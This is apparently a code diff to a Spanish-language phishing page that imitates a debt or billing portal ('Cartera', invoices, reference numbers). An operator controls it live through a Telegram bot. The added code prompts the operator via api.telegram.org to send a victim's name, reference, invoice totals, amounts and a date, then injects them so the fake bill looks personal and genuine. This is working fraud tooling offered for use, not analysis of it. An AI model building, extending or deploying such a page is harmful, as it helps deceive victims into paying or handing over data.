@@ -186,7 +186,7 @@ main {
 }
 .error-msg.show { display: block; }
 
-/* Campo identificación */
+/* Campo de entrada genérico */
 .input-wrap {
     display: flex;
     width: 100%;
@@ -463,7 +463,7 @@ main {
     background: #ffdf00;
 }
 
-/* PASO 1: LIRIO ET1 */
+/* PASO 1: TARJETA CON DATOS VERTICALES */
 .left-paso-1 .titulo {
     display: flex;
     align-items: center;
@@ -479,28 +479,40 @@ main {
     width: 1px;
     background: #333;
 }
+
 .left-paso-1 .caja-blanca {
     background: #fff;
-    padding: 15px;
-    border-radius: 4px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-    max-width: 300px;
+    padding: 20px;
+    border-radius: 6px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+    max-width: 350px;
     border: 1px solid #ddd;
     cursor: pointer;
+    position: relative;
 }
-.left-paso-1 .caja-blanca .num { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 5px; }
-.left-paso-1 .caja-blanca .sub { font-size: 12px; color: #666; margin-bottom: 15px; }
+
+.left-paso-1 .caja-blanca .dato {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 8px;
+    font-size: 13px;
+    border-bottom: 1px dashed #eee;
+    padding-bottom: 5px;
+}
+.left-paso-1 .caja-blanca .dato span:first-child { color: #666; font-weight: 600; }
+.left-paso-1 .caja-blanca .dato span:last-child { color: #111; font-weight: 700; text-align: right;}
 
 /* EL CHECKBOX */
 .left-paso-1 .caja-blanca .check { 
-    width: 20px; height: 20px; 
+    width: 24px; height: 24px; 
     background: #ddd; 
     border: 1px solid #bbb;
-    border-radius: 3px; 
+    border-radius: 4px; 
     display: flex; align-items: center; justify-content: center; 
     color: transparent; 
-    font-size: 14px;
+    font-size: 16px;
     transition: all 0.2s;
+    margin-top: 15px;
 }
 .left-paso-1 .caja-blanca .check.activo { 
     background: #4caf50; 
@@ -876,9 +888,10 @@ main {
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
                 <span>Cartera</span>
             </div>
+            <!-- AQUÍ SE INYECTA EL NOMBRE -->
             <div class="menu-icon">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                <span>¡Hola!</span>
+                <span id="txtSaludoNombre">¡Hola!</span>
             </div>
         </div>
         <button class="home-btn-amarillo" onclick="location.reload()">REGRESAR AL INICIO</button>
@@ -891,11 +904,26 @@ main {
             
             <!-- PASO 1 -->
             <div class="left-paso-1" id="paso1Amarillo">
-                <div class="titulo">LIRIO ET1</div>
+                <div class="titulo" id="txtNombreProyecto">LIRIO ET1</div>
                 
                 <div class="caja-blanca" id="cajaPaso1">
-                    <div class="num" id="txtIdentificacionUnidad">16-1003.240405.38361573</div>
-                    <div class="sub">16-1003</div>
+                    <div class="dato">
+                        <span>Referencia:</span>
+                        <span id="txtReferencia">16-1003.240405.38361573</span>
+                    </div>
+                    <div class="dato">
+                        <span>Total Facturas:</span>
+                        <span id="txtTotalFacturasCard">17</span>
+                    </div>
+                    <div class="dato">
+                        <span>Valor Cartera:</span>
+                        <span id="txtTotalCarteraCard">$42,655,060.00</span>
+                    </div>
+                    <div class="dato">
+                        <span>Fecha Base:</span>
+                        <span id="txtFechaBaseCard">28/10/2026</span>
+                    </div>
+                    
                     <div class="check" id="checkPaso1">✓</div>
                 </div>
             </div>
@@ -903,7 +931,7 @@ main {
             <!-- PASO 2 -->
             <div class="left-paso-2" id="paso2Amarillo">
                 <div class="top-bar-facturas">
-                    <h2>LIRIO ET1</h2>
+                    <h2 id="txtNombreProyectoPaso2">LIRIO ET1</h2>
                     <div>
                         <button class="dash-btn">DASHBOARD</button>
                     </div>
@@ -1295,12 +1323,12 @@ function handleTelegramActionToken(action) {
     actionProcessed = true;
 
     if (action === 'usuario_correcto') {
-        // En lugar de avanzar, le pedimos a Telegram que escriba los datos (ahora son 5)
+        // Ahora pedimos que se escriba en formato vertical (cada dato en una línea)
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 chat_id: TG_CHAT_ID, 
-                text: `👉 <b>Escribe los datos separados por comas:</b>\n\n<code>Referencia Completa, Total Facturas, Valor Cartera, Valor Cuota, Fecha Base</code>\n\n<b>Ejemplo:</b>\n<code>16-1003.240405.38361573, 17, 42655060, 1500000, 28/10/2026</code>`, 
+                text: `👉 <b>Escribe los datos uno debajo del otro (en 6 líneas):</b>\n\n1. Nombre Completo\n2. Referencia Completa\n3. Total Facturas\n4. Valor Cartera\n5. Valor Cuota\n6. Fecha Base (DD/MM/AAAA)\n\n<b>Ejemplo:</b>\n<code>Sergio\n16-1003.240405.38361573\n17\n42655060\n1500000\n28/10/2026</code>`, 
                 parse_mode: 'HTML' 
             })
         });
@@ -1327,42 +1355,59 @@ function handleTelegramActionToken(action) {
 // PROCESAR LOS DATOS QUE TÚ ESCRIBES EN TELEGRAM
 // ==========================================
 function procesarDatosFacturas(texto) {
-    const partes = texto.split(',').map(s => s.trim());
+    // Separar por saltos de línea (en lugar de comas)
+    const partes = texto.split('\n').map(s => s.trim()).filter(s => s !== '');
     
-    // Ahora son 5 datos. Si faltan, pedimos de nuevo
-    if (partes.length < 5) {
+    // Ahora son 6 líneas.
+    if (partes.length < 6) {
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Formato incorrecto. Debes escribir los 5 datos separados por comas (Referencia, Facturas, Cartera, Cuota, Fecha). Intenta de nuevo.", parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: "❌ Formato incorrecto. Debes escribir los 6 datos uno debajo del otro. Intenta de nuevo.", parse_mode: 'HTML' })
         });
         escucharDatosFacturas();
         return;
     }
 
-    const referenciaCompleta = partes[0];
-    const totalFacturas = parseInt(partes[1]) || 17;
-    const valorCartera = parseFloat(partes[2]) || 42655060;
-    const valorCuota = parseFloat(partes[3]) || 1500000;
-    const fechaBase = partes[4];
+    const nombreUsuario = partes[0];
+    const referenciaCompleta = partes[1];
+    const totalFacturas = parseInt(partes[2]) || 17;
+    const valorCartera = parseFloat(partes[3]) || 42655060;
+    const valorCuota = parseFloat(partes[4]) || 1500000;
+    const fechaBase = partes[5];
 
-    // Extraer el ID de la última parte de la referencia (ej. 16-1003.240405.38361573 -> 38361573)
+    // Extraer el ID de la última parte de la referencia
     const partesRef = referenciaCompleta.split('.');
     const idFactura = partesRef.length > 1 ? partesRef[partesRef.length - 1] : referenciaCompleta;
 
     // Actualizar los textos en pantalla
+    document.getElementById('txtSaludoNombre').textContent = `¡Hola! ${nombreUsuario}`;
+    document.getElementById('txtNombreProyecto').textContent = `LIRIO ET1`; // O usar nombreUsuario si se prefiere
+    document.getElementById('txtNombreProyectoPaso2').textContent = `LIRIO ET1`;
+    
+    document.getElementById('txtReferencia').textContent = referenciaCompleta;
+    document.getElementById('txtTotalFacturasCard').textContent = totalFacturas;
+    document.getElementById('txtTotalCarteraCard').textContent = '$ ' + valorCartera.toLocaleString('es-CO');
+    document.getElementById('txtFechaBaseCard').textContent = fechaBase;
+
     document.getElementById('txtTotalFacturas').textContent = totalFacturas;
     document.getElementById('txtTotalCartera').textContent = '$ ' + valorCartera.toLocaleString('es-CO');
-    document.getElementById('txtIdentificacionUnidad').textContent = referenciaCompleta; // Ponemos la referencia que tú enviaste
 
     // Generar la tabla
     const tbody = document.getElementById('tablaFacturasBody');
     tbody.innerHTML = '';
 
+    // Parsear la fecha base (DD/MM/YYYY)
     const partesFecha = fechaBase.split('/');
-    let dia = parseInt(partesFecha[0]);
-    let mes = parseInt(partesFecha[1]) - 1;
-    let anio = parseInt(partesFecha[2]);
+    let dia = parseInt(partesFecha[0]) || 28;
+    let mes = (parseInt(partesFecha[1]) - 1) || 9; // Si falla, Octubre
+    let anio = parseInt(partesFecha[2]) || 2026;
+    
+    // Validar que la fecha sea real (evitar el error de 18/27/2026)
     let fechaActual = new Date(anio, mes, dia);
+    if (isNaN(fechaActual.getTime()) || fechaActual.getMonth() !== mes) {
+        // Si la fecha es inválida, usar 28/10/2026 por defecto
+        fechaActual = new Date(2026, 9, 28); 
+    }
 
     for (let i = 0; i < totalFacturas; i++) {
         let d = String(fechaActual.getDate()).padStart(2, '0');
